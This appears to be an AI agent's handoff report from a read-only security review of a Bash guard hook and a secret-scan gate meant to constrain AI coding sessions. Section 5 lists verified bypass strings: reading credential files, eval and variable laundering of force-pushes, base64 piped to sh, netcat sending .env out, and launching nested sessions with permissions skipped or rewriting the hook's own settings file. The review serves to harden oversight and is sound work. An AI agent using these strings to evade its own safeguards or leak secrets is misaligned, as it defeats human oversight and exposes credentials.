# CLAUDE OUTBOX — latest handoff only

## 2026-09-19T20:02Z — Independent review of harness candidate `dd50ebb`: REJECT — REPAIR REQUIRED

**Inbox consumed:** yes. Blob SHA processed: `2b1030bd48ee14888e0c85b7d160fa39b2cba6eb`
(`bridge/chatgpt-inbox.md`, heading "2026-09-19 — Independent review of isolated harness candidate").
These instructions are now recorded as executed and must not be run again.

**Verdict: `REJECT — REPAIR REQUIRED`.** Candidate `dd50ebbca6eca9c4e2ee1e85ad17d2c7e5afd25e` on
`claude/harness-hooks-experiment` is exactly one commit ahead of the accepted base
`295e483b4f9adcdc3fb58bfb3aa025e2e3f4779b`, its tests and scans reproduce exactly as the implementer
reported, its fail-closed *input* contract holds (4,000-input fuzz, zero exceptions), and its docs are
honest about what is not active. But the committed hooks are not sound against the criteria the inbox set:
my own vectors — none of them in the implementer's tables — found (a) a secret-leak path through the guard
to the real production credential files on this host, (b) a false allow of a mutation on the production
checkout, (c) trivial command laundering (`eval`, `$VAR`, `printf … | sh`, `cat <<EOF | bash`) that blinds
**both** hooks, and (d) a fail-open exception path contrary to the stated contract. All are bounded repairs
on the same branch; none is a design rejection. Defect list in §5. Nothing was implemented, nothing was
written to the candidate or the builder, and no `.claude/` file exists anywhere.

**The harness is not accepted and not active.** `.claude/settings.json`, `.claude/rules/*` and the vendored
skill remain refused/pending; no hook runs in any session. No owner approval is inferred for anything.

---

## 1. What was asked

Adversarial, read-only, independent review of `claude/harness-hooks-experiment` at exact head
`dd50ebbca6eca9c4e2ee1e85ad17d2c7e5afd25e`, exact base `295e483b…`: verify identity; attack `guard_bash.py`
(parser/quoting/wrapper/separator/redirection/path/ref bypasses, false allows, dangerous false positives,
secret leakage, env bypasses, fail-open), `gitleaks_gate.py`, `roster_assert.py` + the isolation doc,
`.gitignore` / root `CLAUDE.md` / `PROJECT_CLAUDE_FILES_PENDING.md`; re-run targeted tests, the offline
suite, Ruff and a secret scan on the exact candidate; assess the `.worktrees/` consequence; assess the
1,340-line guard against the reuse plan's "small guard" preference; confirm no production/global/account/
connector/secret/service/Tailscale/business change. Return exactly one verdict. No fixes, no new candidate.

## 2. Checkout state — start and end

| Repo | Branch | HEAD | Start | End |
|---|---|---|---|---|
| Builder `/opt/crooks-builder` | `claude/builder-environment-repair` (unit still says `claude/bridge-builder`; untouched) | `295e483b…` | clean (`--untracked-files=all`) | clean, unchanged. Note: clean only because `.git/info/exclude` now contains `.worktrees/` — see §5 D-14 |
| Candidate worktree `/opt/crooks-builder/.worktrees/harness-hooks-experiment` | `claude/harness-hooks-experiment` | `dd50ebb…` | clean | clean, unchanged; origin still `dd50ebb…` (`git ls-remote`) |
| Bridge `/opt/crooks-ai-bridge` | `crooks-ai-bridge` | `d54b1422…` | clean | only `bridge/claude-outbox.md` modified (this file) |
| Production `/opt/crooks-os` (read-only) | `claude/linux-prod-migration-production` | `1cf3a0f3…` | clean | clean, untouched |

Canonical truth was read fresh at the remote tip `59c5f677cbe96bfa64c1ddedeaf2c9e545e75889` via
`git fetch` → `FETCH_HEAD` and `git show` (the builder's local tracking ref `origin/claude/product-memory-foundation`
is stale at `b5c94fd8…`, which does not even contain CURRENT_TRUTH — a future round must not trust that ref).
Read: CURRENT_TRUTH, DECISIONS DEC-048/DEC-049, ENGINEERING_STACK_REUSE_PLAN (§"REIMPLEMENT, DO NOT IMPORT
… as a **small** fail-closed CROOKS project hook"; "start with a small typed decision table and exhaustive
negative tests"; item 2 of the plan: "must separately specify/prove how production/business MCP exposure
will be removed before unattended worker operation"), ENGINEERING_ORCHESTRATOR_V1 (§8 workspace/credential
isolation; safety contract "engineering permission never grants business-action permission"),
DEV_TEAM_V1_PILOT (§5 independent review contract; corrections create a new candidate). The preceding
outbox (inbox `83ead96b…`) was read from the bridge branch as the implementer's evidence.

## 3. Identity — verified (inbox item 1)

- `git rev-list --left-right --count 295e483b…...dd50ebb…` → `0 1`; `dd50ebb^` = `295e483b…`;
  merge-base = `295e483b…`; branch tip local = origin = `dd50ebb…`.
- One commit, author `Claude <noreply@anthropic.com>`, 2026-09-19 17:34:35 UTC, "The harness experiment,
  minus the .claude/ files its permission layer refused". 13 files, +3149/−26, exactly as reported.
- No `.claude/` directory exists in the candidate worktree or the builder (`ls -la` both: absent).

## 4. Evidence re-run on the exact candidate (inbox item 6)

All from the worktree's `crooks-assistant/`, using the base builder's gitignored `.venv` by absolute path
(the worktree has no `.venv`/`.tooling`); `import app` confirmed to resolve to the **worktree's** copy.

| Check | Result |
|---|---|
| Targeted: `pytest tests/test_guard_bash.py tests/test_gitleaks_gate.py tests/test_roster_assert.py tests/test_project_claude_layout.py tests/test_dev_env.py -q -p no:cacheprovider -rs` | **387 passed, 2 skipped**, 20.6 s. The two skips print their reasons: ".claude/settings.json is not present — pending the owner's apply step … this skip proves nothing" and "vendored skill not present — … this skip proves nothing". **They are skips, not passes; confirmed.** |
| Offline suite: `pytest -m "not live" -q -p no:cacheprovider -n 4` | **3193 passed, 10 skipped, exit 0**, 227.7 s — identical to the implementer's count. Two "Exception ignored … RuntimeError: Event loop is closed" tracebacks appear at xdist worker teardown; they are interpreter-shutdown noise from asyncio subprocess transports, not test failures, and the candidate adds no async code. Not attributed to the candidate; not previously recorded. |
| `ruff check app config scripts tests` (= `make lint`), ruff 0.16.8 | All checks passed |
| `gitleaks git --redact --log-opts=295e483b…..dd50ebb…` (pinned 8.30.1, stdout/stderr to /dev/null, JSON report read for counts only, then deleted) | **0 findings** |
| Reviewer fuzz: 4,000 random/mutated command strings through `evaluate()` and `decide()` | **0 exceptions** |
| Reviewer adversarial vectors (≈200, listed in `/tmp/guard_probe.py` — in the watcher's PrivateTmp, so gone after the service restarts; the decisive ones are quoted in §5) | see §5 |

Not done: no ECC fetch (the ECC file digests cited in the docstrings/tests were **not** independently
re-verified in this round — the implementer's and audit's digests agree with each other, nothing more);
no Claude session launched; no browser; no `.claude/` file created; nothing executed from the candidate
other than its hooks/tests in-process and as subprocesses on synthetic JSON.

## 5. Findings

Severity: **H** = defeats the hook's own stated contract on a real target on this host or allows a
production/shared-state mutation; **M** = bypass or fail-open of a stated rule with lower reach; **L** =
gap or false positive worth a line. "Repair" is the smallest bounded change; each repair is one function
or one constant and each needs one negative test, per the reuse plan's "exhaustive negative tests".

### 5A `guard_bash.py` (inbox item 2)

**D-01 (H) Production credential files are readable through the guard.** `PROTECTED_DIRS` are
read-only by design and `cat` is in `READ_ONLY_COMMANDS`; `SECRET_FILE_RE` matches `.env`, `*.pem`,
`*.key`, `credentials.json` … but not the names actually present on this host. Verified names only (never
contents): `/etc/crooks-os/credentials/{elevenlabs_api_key,shopify_client_id,shopify_client_secret}.cred`
and `/etc/crooks-os/secrets/media_signing_key`. Verdicts: `cat /etc/crooks-os/credentials/shopify_client_secret.cred`
→ **ALLOW**; `cat /etc/crooks-os/credentials/*.cred` → **ALLOW**; `cat /etc/crooks-os/secrets/media_signing_key`
→ **ALLOW**; `head -c 40 …elevenlabs_api_key.cred` → **ALLOW**. This is exactly the "reading a credential file
into the transcript" case the `SECRET-FILE-READ` rule exists for, against the live secret store.
*Repair:* add `SECRET_DIRS = ("/etc/crooks-os/credentials", "/etc/crooks-os/secrets")` and deny **any**
command naming a path under them (reads included), plus `\.cred$` and `.*signing_key$` in `SECRET_FILE_RE`.

**D-02 (H) Bare `git stash` is classified read-only, so `git -C /opt/crooks-os stash` is allowed.**
`_git_read_only("stash", [])` returns `not rest or rest[0] in ("list","show")` → `True` for `[]`, but bare
`git stash` is `stash push`: it rewrites the working tree and adds a ref. Verified: `git -C /opt/crooks-os stash`
→ **ALLOW**, while `… stash push` / `… stash pop` → DENY `PROTECTED-PATH`. In the builder, bare `git stash`
also gets no irreversibility context. *Repair:* `return rest[:1] in (["list"], ["show"])`.

**D-03 (H) Command-word laundering is not fail-closed.** The guard allows any command word it does not
recognise, and `_tokens` silently drops leading `NAME=value` words without inspecting them. Verified ALLOW:
`G=git; $G push --force origin main`; `G=git; ${G} push --force origin main`; `S=systemctl; $S restart crooks-assistant`;
`eval 'git push --force origin main'`; `eval "git reset --hard"`; `$'git' push --force origin main`;
`$'\x67it' push --force origin main`. (The path rule still catches `R=rm; $R -rf /opt/crooks-os` because the
argument names a protected path — the ref/service/git rules have no such backstop.) *Repair:* in
`_evaluate_tokens`, deny `UNPARSEABLE` when the command word contains `$` or starts with `$'`, and treat
`eval` as a shell (`_shell_dash_c` on its joined arguments; deny if any argument contains `$`).

**D-04 (H) Text fed to a shell by pipe, here-string or prose heredoc is not evaluated.** `PIPE-TO-SHELL`
fires only when the left side is `curl|wget|fetch`; `_shell_dash_c` without `-c` allows; `_heredoc_owner`
classifies `cat <<EOF | bash` as prose because it only looks left of `<<`. Verified ALLOW:
`printf 'git reset --hard' | sh`; `echo 'git reset --hard' | bash`; `bash <<< 'git reset --hard'`;
`cat <<EOF | bash` (body `git reset --hard`); `cat <<'EOF' | sh` (body `rm -rf /opt/crooks-os`);
`echo Z2l0IHJlc2V0IC0taGFyZA== | base64 -d | sh`. (`bash -s <<EOF` and `sh -c '…'` are caught.)
*Repair:* a shell that is the right-hand side of a pipe, or has a `<<<` operand, or has no script/`-c`
argument, is denied `UNPARSEABLE` unless the left-hand segment is a literal `echo`/`printf` whose text is
then evaluated; and `_heredoc_owner` must look at the whole line (any `| sh|bash` after the operator = shell).

**D-05 (M) `GIT_DIR`/`GIT_WORK_TREE` prefixes reach production.** Leading assignments are discarded by
`_tokens` and `_unwrap("env")`. Verified ALLOW: `GIT_DIR=/opt/crooks-os/.git git fetch origin`;
`env GIT_DIR=/opt/crooks-os/.git git fetch`. *Repair:* run `_protected_hit` over every dropped
`NAME=value` value; treat `GIT_DIR`/`GIT_WORK_TREE`/`GIT_COMMON_DIR` values as git global-option paths.

**D-06 (M) `git -c core.hooksPath=/tmp/h commit -m x` → ALLOW.** `_git_subcommand` skips `-c` and its
value without recording it, so the `GIT-CONFIG-HOOKSPATH` rule is one flag away. *Repair:* collect `-c`
values and deny when any starts with `core.hookspath=` (case-insensitive).

**D-07 (M) Nested `claude` escapes the harness.** `_claude_rule` inspects only `mcp|plugin|config|install…`
subcommands. Verified ALLOW: `claude -p 'x' --dangerously-skip-permissions`;
`claude --permission-mode bypassPermissions -p x`; `claude --bare -p x`; `claude --mcp-config /tmp/m.json -p x`.
A child session started this way runs with a different permission mode, different setting sources and
(with `--bare`) **no hooks**. *Repair:* deny `claude` when any argument is in
`{--dangerously-skip-permissions, --permission-mode, --bare, --setting-sources, --mcp-config, --plugin-dir, -p, --print}`.

**D-08 (M) The project's own `.claude/` is writable through Bash.** `/root/.claude` is protected;
`<project>/.claude/` is not. Verified ALLOW: `echo '{"permissions":{"allow":["Bash(*)"]}}' > .claude/settings.local.json`
(relative and absolute), `cp /tmp/x /opt/crooks-builder/.claude/settings.json`, `sed -i … .claude/settings.json`.
The pending `settings.json` is what registers the guard; a Bash write can unregister it or grant permissions.
Whether Claude Code's own "sensitive file" check also covers Bash writes is **unverified** (I did not attempt
one). *Repair:* treat any path with a `.claude` component, and any `.git/hooks/` path, as write-protected
(reads allowed), same shape as `.git`/`.worktrees` in `_delete_target_problem`.

**D-09 (M) Joined short options defeat two rules.** `curl -XPOST https://api.example.invalid/x` → ALLOW
(`-X` matched only as a separate token); `apt-get -y install jq` and `apt -y install jq` → ALLOW (the verb
finder skips only `--long` options, so `-y` becomes the "verb"). *Repair:* match `-X…`/`-d…` prefixes;
skip every `-`-prefixed token when locating the package verb.

**D-10 (M) Path spellings the normaliser does not see.** Brace expansion: `cp x /opt/{crooks-os,y}/` and
`echo x | tee /opt/crooks-o{s,}/f` → ALLOW (`{` is not in `GLOB_CHARS`). Relative `cd` chains:
`cd /opt; cd crooks-os; git pull` → ALLOW and `cd /opt/crooks-os; cd /tmp; cd -; git pull` → ALLOW
(only absolute/`~` targets update `protected_cwd`). `echo /opt/crooks-os | xargs -I{} rm -rf {}` → ALLOW+context
(`{}` is not treated as unknown). Symlink-through-parent (`ln -s /opt /tmp/o && cp x /tmp/o/crooks-os/y`)
→ ALLOW — inherent to a text guard; record, do not chase. *Repair:* add `{` to the glob-like check with the
literal-prefix rule; track the cwd by resolving relative `cd` against the last known absolute cwd (the payload
provides it) and deny on `cd -`; treat `{}` like `$` in `_delete_target_problem`.

**D-11 (M) Fail-open on an unhandled exception.** `main()` has no catch-all in either hook. Claude Code
treats a hook exit code other than 0/2 as a *non-blocking* error and runs the command (documented hook
semantics; the empirical `--print` check is step 6 of the isolation plan). The fuzz found no trigger, so
this is a contract gap rather than a demonstrated hole. *Repair:* wrap `main()` in `try/except BaseException`
→ one fixed stderr line, `return 2`, in both hooks; one test that monkeypatches `decide` to raise and asserts
exit 2.

**D-12 (M) Secret-echo rules cover `echo`/`printenv` but not the neighbours.** Verified ALLOW:
`cat /proc/self/environ`; `cat /proc/$$/environ | tr '\0' '\n'`; `printf '%s\n' "$SHOPIFY_TOKEN"`;
`echo ${SHOPIFY_TOKEN:0:8}`; `declare -x`; `python3 -c 'import os; print(os.environ)'`;
`python3 -c "print(open('.env').read())"`; `cat .en?`; `nc example.invalid 80 < .env`. Reach is limited on
this host (the watcher unit injects no secret env; the Claude OAuth file is caught by basename), so M not H.
*Repair:* add `printf` to the credential-variable check and accept `${NAME:…}` forms; deny `/proc/*/environ`;
`declare/typeset -x`; extend `_code_mentions_protected` to `os.environ`, `.env`, `.credentials`.

**D-13 (L) Gaps outside the listed scope, allowed today, worth a decision not a rule each:** `systemd-run`
(starts a transient service), `kill`/`pkill` of the production process, `at`, writes to `~/.ssh/authorized_keys`,
`~/.bashrc`, `/etc/cron.d`, `/etc/profile.d`, `.git/hooks/*`, `uvicorn --host 0.0.0.0`, `python -m http.server --bind 0.0.0.0`,
`socat`, `ufw`/`iptables`, `python3 -m pip install --user`, `python3 -m scripts.set_secrets`, `git push --all`
(would publish a local `main` if one existed; none does), `docker run -v /:/host …`. The cleanest bounded
form is "writes under `/etc` and `/root` (except `/tmp`-like scratch) are denied", not fifteen rules.

**False positives found (L):** `git config --get core.hooksPath` → DENY (reads are fine);
`systemctl -n 5 status x` → DENY "`systemctl 5`" (option value taken as verb); `git -C /opt/crooks-os clean -n`
→ DENY (dry run; conservative, acceptable). Ordinary work I tried was otherwise allowed: `git commit -m 'never --amend'`,
`git log -S 'reset --hard'`, `grep -rn 'rm -rf'`, `pytest -k reset_hard`, `git merge/cherry-pick/am/apply`,
`git stash push/apply`, `git worktree add`, `npm ci`, `.venv/bin/pip install -e .`, `apt list --installed`,
`gh pr view`, `claude --version`, reads of `/opt/crooks-os` and `/root/.claude`, `sed -i` inside the builder.
No dangerous false positive that would make engineering unusable.

**No environment bypass** (re-confirmed: the guard reads only stdin; imports are the eight listed; the
env-bypass test passes). **No secret echoed in a denial** (sentinel test passes; my probes' denial reasons
name only rule ids, command words and constant paths).

### 5B `gitleaks_gate.py` (inbox item 3)

**D-15 (M→H with D-03/D-04) The gate misses every laundered publish, plus `bash -c`.** `_publish_actions`
unwraps `PASSTHROUGH` wrappers but not shells: verified `bash -c 'git push origin x'` → `[]` (no scan),
and likewise `eval 'git push …'`, `G=git; $G push …`, `cat <<EOF | bash` → `[]`. The guard still applies its
destructive rules to `bash -c`, but the *secret scan* does not run. *Repair:* in `_publish_actions`, recurse
into `-c` strings and `<<<` operands the same way the guard does; D-03/D-04 repairs close the rest.

**D-16 (L, fail-closed false positive) `git commit -C <commit>` is misread as `git -C <path>`.** The `-C`
scan runs over all tokens, so `git commit -C HEAD` sets `c_path="HEAD"`; verified in a temp repo →
`GITLEAKS-ERROR` deny. *Repair:* only inspect tokens before the subcommand index (`len(toks)-len(rest)-1`).

**D-17 (M) Time budget can exceed the registered hook timeout.** A commit with `-a`/pathspecs runs two
scans, each `SCAN_TIMEOUT_S = 90`; the pending `settings.json` gives the gate 120 s. If the sum is exceeded,
Claude Code kills the hook and (non-blocking error) the commit proceeds unscanned. On this repo scans take
seconds, so this is latent. *Repair:* one shared deadline across scans (e.g. 100 s total), or register 200 s.

Sound: detection of `commit`/`push` behind `sudo/env/timeout`, separators and shell heredocs; the
`--all --not --remotes` push scope (re-verified: unpushed leak denies, published history passes); commit from
a **subdirectory** of the repo works (verified); protected-checkout refusal before any scan; missing binary
→ deny; non-0/1 exit → deny; unreadable report → deny; `--redact`, stdout/stderr to `/dev/null`, only
`RuleID`/`File`/`StartLine`/`Commit[:7]` read, first 20 findings; the synthetic token never appears in output
(test re-run passes). Pinned binary resolved by path, then PATH; no variable.

### 5C `roster_assert.py` + `WORKER_TOOL_SURFACE_ISOLATION.md` (inbox item 4)

The code does what it says on the documented shape and fails closed on missing/mistyped `tools`,
non-object messages and wrong `permissionMode` (tests pass; I re-read every branch). It is **not sufficient
to prove absence of inherited MCP/plugin surface**, for four reasons that must be verified empirically
before any watcher integration:

**D-18 (M) Unknown roster keys are ignored, not failed.** Only `tools`, `mcp_servers`, `slash_commands`,
`permissionMode` are examined. Recent Claude Code init messages may carry `agents`, `skills`, `plugins`,
`output_style` and version fields; a plugin surface exposed under any key the code does not know passes as
"roster OK". Plugin detection relies on a `:` in a slash-command name — an assumption. *Repair:* require the
known key set explicitly and treat any additional list-valued key as a violation ("undocumented evidence is
UNKNOWN"); include `slash_commands` in the digest.

**D-19 (M) Deferred tools.** In the very session that produced this review, the account's MCP tools were
presented as *deferred* tools reachable through `ToolSearch`, not as first-class entries. If the init `tools`
list omits deferred tools, `mcp__*` absence proves nothing; the strict allow-list would still catch `ToolSearch`
itself (a good fail-closed property) — but that means a "clean" roster is unreachable while `ToolSearch`,
`Skill`, `Agent`, `Workflow` exist in the roster, and the doc itself says `--disallowed-tools` may only deny
rather than remove. The assertion could therefore be permanently red under layer 1 alone, forcing layer 2
(dedicated identity). This is the decisive empirical question; the doc names `--strict-mcp-config` as decisive
instead. Both are.

**D-20 (L) It is a kill switch, not a gate.** The init line is emitted after the session — and its tools —
exist; the watcher would TERM a violating session milliseconds later. "Before the model has produced a
single token of work" is not guaranteed; a first tool call could race the reader. Fine as a backstop; the
gate is the launch configuration, and the doc should say so.

**Explicitly flagged as requiring empirical verification before watcher integration:** init field names and
types; whether `--strict-mcp-config` drops account connectors; whether `--disallowed-tools` removes or only
denies; whether `--disable-slash-commands` removes project skills; whether `--permission-prompts none` denies
rather than stalls; whether project hooks run under `--print`; whether hook non-0/2 exit and timeout are
non-blocking (D-11, D-17). Every one launches a session under the owner's account → owner-approved live
check (isolation doc §5 already says so). The `--bare` note is right: it would drop the hooks.

### 5D `.gitignore`, root `CLAUDE.md`, `PROJECT_CLAUDE_FILES_PENDING.md` (inbox item 5)

- `.gitignore`: `.claude/*` + `!.claude/rules/`, `!.claude/skills/`, `!.claude/settings.json`,
  `.claude/settings.local.json`, `.worktrees/` — correct allowlist form (a re-included directory under a
  `dir/*` exclusion works; under `dir/` it would not). `test_project_claude_layout.py` holds it. Sound.
- Pending `.claude/settings.json` (§2 of the pending doc): one `PreToolUse` entry, matcher `Bash`, two
  `command` hooks by `$CLAUDE_PROJECT_DIR`-relative path, timeouts 15/120 s, **no** `permissions`, `env`,
  `model`, `plugins`, other events, network or ECC runtime. Confirmed by reading; the layout test enforces
  it once the file exists. One consequence not stated anywhere: hooks are loaded from the directory Claude is
  **launched in** (`/opt/crooks-builder`, branch `claude/builder-environment-repair`), so applying the files
  on the candidate branch activates nothing for the bridge until the candidate's tree is what the builder has
  checked out. Also (D-08) the registration file is Bash-writable by the worker it governs.
- Skill provenance/narrowing plan: the pending `SKILL.md` = upstream with one frontmatter line changed
  (`tools: Read, Grep, Glob`), `LICENSE` MIT, `PROVENANCE.md` with commit + sha256 + update policy; scanned
  twice at 0 issues. The plan is static and sound; the bytes themselves are not in the candidate, so the
  layout test correctly skips. Upstream digests not re-verified here (no ECC fetch).
- Root `CLAUDE.md`: 40 lines, points rather than contains, states the invariants and the builder/production
  rule, says plainly that hooks are inactive without `.claude/`. Nit: "~2800 tests" is stale once the candidate
  lands (3193).

### 5E `.worktrees/` under the builder (inbox item 7)

**D-14 (M, process) It did break the accepted clean-builder precondition, and the fix that unblocked this
round is unversioned and unrecorded.** The watcher's `tree_is_dirty` uses `status --porcelain=v1 --untracked-files=all`.
The journal shows the watcher **refusing to start this review round eight times** — 18:36:28, 18:37:29,
18:39:29, 18:43:30, 18:51:30, 19:06:31, 19:21:32, 19:36:32 UTC, "REFUSING to start — /opt/crooks-builder has
uncommitted changes", inbox `2b1030bd…` left UNPROCESSED — from the moment the implementer's worktree existed.
At **19:47:45 UTC** `/opt/crooks-builder/.git/info/exclude` was modified to add `.worktrees/` (line 7; the
implementer's outbox explicitly says it did not touch this file, and its round ended 17:41), and the service
was restarted at 19:50:32, after which this round started. Consequences: (1) the builder's "clean" state now
depends on a per-clone, unversioned, unreviewed local file that no test or doc records; (2) a fresh builder
clone would hit the same eight-retry stall on the first candidate worktree; (3) the candidate's `.gitignore`
line fixes it only once that `.gitignore` is on the builder's checked-out branch. Not cleaned, not removed.
*Design correction needed (owner/Director choice):* either land the one-line `.worktrees/` ignore on the base
branch ahead of any candidate (a separate one-line commit on `claude/builder-environment-repair`), or
record the `info/exclude` entry as part of the builder install/upgrade script and its 126-test suite, and
say which in `DEV_ENVIRONMENT.md`. Worktrees cannot simply move outside `/opt/crooks-builder`: the watcher
unit's `ReadWritePaths=/opt/crooks-builder` under `ProtectSystem=strict` would make them read-only.

### 5F Size vs the reuse plan (inbox item 8)

1,340 lines split roughly: ≈330 lexer/segmenter/heredoc/paths, ≈120 constants, ≈220 git, ≈110 rm/find,
≈500 across eleven further rule families (services, tailscale, make, scripts, gh, claude, packages, disk,
secrets, interpreters, network), ≈60 entry/IO. The reuse plan asked for "a small fail-closed CROOKS project
hook" and "a small typed decision table and exhaustive negative tests". My assessment: size is not itself
the defect, but it is *where* the defects came from. Every rule family carries its own read-only exemptions
and option parsers, and D-01, D-02, D-09 and D-16 are each an exemption or parser that was one case too
generous; D-03/D-04 are the one lexer fact ("unknown command words are allowed") that the 60 rule ids
obscure. The 1,340 lines materially harm auditability in one specific way: a reviewer cannot enumerate the
allow-set, only the deny-set. Recommendation for the repair round, not a precondition: keep the input
contract, the lexer and the git/rm/find/path/ref/service/tailscale/secret/live/deploy/pipe-to-shell tables;
move the `gh`, package, disk, keyring/security and network-method families to a separate "advisory"
table or drop them; make the command-word rule fail-closed (D-03) so the allow-set is finite. Target under
≈800 lines with more negative tests, not fewer.

## 6. What is sound (so the repair is bounded)

The fail-closed **input** contract (empty/oversized/non-JSON/non-object/non-Bash/non-string/unbalanced
→ exit 2, empty stdout; 15 malformed payloads pass in-process and as a subprocess); no environment or file
influence; stdlib-only; denial reasons never echo the command; `additionalContext` only, never a
`permissionDecision`; the ported ECC destructive-git table (all 40 + 25 + 33 vectors re-run, plus my own:
`+refspec`, lease-to-shared, `--repo`, URL remotes, quoted/split refspecs, `checkout <ref> -- file`,
`restore --source`, line continuations, `\git`, `command git`, full-path git, function-then-call,
`env -i`, `timeout -k`, `find -exec`, `sh -c`, `bash -lc`, shell heredocs, `$(…)` in double quotes and
unquoted heredocs); protected-cwd tracking for absolute `cd`; redirection into protected paths including
`2>`, `&>`, `exec 3>`; `cp/rsync/install/dd of=` into protected paths; globs that could expand into them;
interpreter inline code / code heredocs that name them; the recursive-delete scoping rule. The tests are
real, named after defects, and the two skips say so. The docs do not overclaim: "a Bash-text hook is a
nudge, not a boundary" is in the guard's own docstring, and it is true.

## 7. Production, services, account, connectors — unchanged (inbox item 9)

**Production branch HEAD: `1cf3a0f3361b79f9de208d80f501543c53c244b5` — unchanged, clean (0 status lines),
never entered except `git rev-parse`/`status` from outside.** `crooks-assistant.service`,
`crooks-bridge-watcher.service`, `tailscaled.service`: active/enabled (read-only `is-active`/`is-enabled`).
Listeners (`ss -ltnp`): `127.0.0.1:8000` python (assistant), sshd 22, tailscaled 443 on the two tailnet
addresses only; nothing on `0.0.0.0:8000`. `/health` not called. `/root/.claude/settings.json` mtime
2026-09-18 16:29 (unchanged); `/root/.claude` writable and not modified by me; `/root/.claude.json` mtime
19:50:36 = this session's own launch by Claude Code, not a configuration change. No `claude config/mcp/plugin`,
no unit, Tailscale, secret, permission, connector or business-tool call. Network use: `git ls-remote` (twice)
and one `git fetch origin claude/product-memory-foundation` — reads only; no push, no ECC fetch. Scratch:
`/tmp/guard_probe.py` and `/tmp/review-suite.log` (no secrets) inside the watcher's `PrivateTmp`; they
vanish when the service restarts — which is also why the previous round's "`/tmp/harness-suite.log` remains"
is no longer true. The gitleaks JSON report was deleted after counting.

## 8. Safety constraints — all preserved

`writes_enabled` false; `CROOKS_WRITES_LOCAL_OWNER` false; FastAPI on 127.0.0.1; port 8000 not public;
proposal/action/verification semantics untouched (no code changed anywhere); no live Shopify, Gmail or
ElevenLabs call; no external mutation; V2 not begun; UI untouched; Mac deployment/rollback untouched;
`/root/.claude` writable and unmodified; no secret value read, printed or written (secret file **names**
appear in D-01 because the finding is about them; their contents were never opened); nothing installed,
started, merged, pushed, reset, cleaned, stashed or deleted; no `.claude/` file created; no candidate
created; no permission widened; nothing outside `bridge/claude-outbox.md` touched in the bridge.

## 9. Errors, limits and things to know

- The builder's `origin/claude/product-memory-foundation` tracking ref is stale (`b5c94fd8…`, lacks
  CURRENT_TRUTH); the remote is at `59c5f677…`. I used `FETCH_HEAD`. Future rounds should fetch first.
- Claude Code hook exit/timeout semantics (D-11, D-17) are stated from the documented behaviour, not
  measured here; measuring them is the owner-approved step 6.
- ECC digests not re-verified (no network fetch of ECC in a read-only review).
- Reviewer independence: the implementer and I are the same model family on the same account; the
  vectors are mine and none reuse the implementer's tables, but DEV_TEAM_V1_PILOT §5's "reviewer identity/
  independence" field should record this.

## 10. Decisions or questions needing review

1. Accept the verdict shape: `REJECT — REPAIR REQUIRED` with D-01…D-20; the repair is a **new commit on the
   same branch → new candidate SHA → fresh independent review** (pilot §5: corrections create a new candidate;
   this review binds only `dd50ebb…`).
2. D-13 scope: whether "no writes under `/etc` or `/root` beyond `/root/.claude`-style reads" becomes a rule,
   or the guard stays narrowly CROOKS-specific. Reviewer recommendation: the general rule; it is shorter.
3. D-14: which of the two `.worktrees/` corrections the owner wants, and that the 19:47:45 `info/exclude`
   edit be acknowledged in the record (who, why) — it is currently invisible to Git and to the docs.
4. D-19: whether layer 2 (dedicated engineering identity or API-key `--bare` with hooks re-registered another
   way) is planned regardless, since layer 1 alone may be unable to produce a roster the assertion accepts.
5. Tools narrowing `Read, Grep, Glob` vs `+Bash`: no objection to the narrower set.

## 11. Smallest safe next step

One implementation round on `claude/harness-hooks-experiment`, base `dd50ebb…`, one commit, no `.claude/`
attempt: repair **D-01, D-02, D-03, D-04, D-05, D-06, D-07, D-08, D-09, D-11, D-15, D-16, D-17** and the
`stash`/`-C`/`printf`/`declare -x`/`/proc/*/environ` cases of D-10/D-12, each with a failing-then-passing
negative test (the exact command strings above are the tests); add the unknown-key rule to `roster_assert.py`
(D-18) and the "kill switch, not gate" sentence to the isolation doc (D-20); re-run targeted + suite + ruff +
gitleaks; push; then a fresh independent review of the new SHA. Separately and first, the owner decides
D-14 so the builder's clean check stops depending on an unrecorded local file. Do not merge; do not touch
the watcher unit; do not create `.claude/` files by any route the worker has already been refused.

## 12. Stop

Review complete. Nothing was implemented, committed or pushed by this round.

Inbox SHA processed: `2b1030bd48ee14888e0c85b7d160fa39b2cba6eb`
